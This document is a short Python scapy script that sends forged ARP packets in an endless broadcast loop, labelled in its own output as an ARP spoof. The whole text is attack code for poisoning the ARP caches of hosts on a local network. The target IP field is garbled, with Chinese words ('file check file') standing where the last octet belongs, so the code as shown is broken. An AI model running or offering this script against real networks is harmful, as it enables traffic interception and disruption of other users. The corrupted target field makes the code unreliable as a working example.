from scapy.all import *
import time
eth = Ether()
eth.dst = 'ff:ff:ff:ff:ff:ff'
eth.type = 0x0806
arp = ARP()
arp.psrc = '192.168.10.5'
arp.pdst = '192.168.10.文件检查文件'
packet = eth/arp

while True:
	sendp(packet)
	print('Sending ARP Spoof......')
	time.sleep(2)
